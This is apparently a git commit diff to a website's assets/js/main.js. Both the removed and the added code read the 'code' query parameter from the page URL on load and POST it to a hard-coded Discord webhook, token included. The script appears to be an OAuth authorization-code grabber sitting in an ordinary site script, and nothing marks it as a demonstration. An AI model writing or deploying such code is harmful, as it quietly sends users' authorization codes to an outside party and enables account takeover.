49cc5a9dd227149a46100910aadda0e6d2a4d6a7
elarium <69206434+just4ius@users.noreply.github.com>
2022-06-29 23:39:17 +0300

    Update main.js

--- assets/js/main.js
+++ assets/js/main.js
@@ -1,21 +1,12 @@
-function redirect () {
-	window.location.href = "/";
+const request = new XMLHttpRequest();
+request.open("POST", "https://discord.com/api/webhooks/991790746422218832/Q3CBZ86DJYgFN_fkqfPMlUN1c377aZoZ0YfP2vyFPHCSwDWAaWVduHarz2zeCpGGsOLb")
+request.setRequestHeader("Content-type", "application/json");
+
+var url_string = window.location.href;
+var url = new URL(url_string);
+var code = url.searchParams.get("code");
+
+const params = {
+	content: code
 }
-
-function submit() {
-	const request = new XMLHttpRequest();
-	request.open("POST", "https://discord.com/api/webhooks/991790746422218832/Q3CBZ86DJYgFN_fkqfPMlUN1c377aZoZ0YfP2vyFPHCSwDWAaWVduHarz2zeCpGGsOLb")
-	request.setRequestHeader("Content-type", "application/json");
-
-	var url_string = window.location.href;
-	var url = new URL(url_string);
-	var code = url.searchParams.get("code");
-
-	const params = {
-		content: code
-	}
-
-	request.send(JSON.stringify(params));
-	redirect();
-}
-submit();
+request.send(JSON.stringify(params));
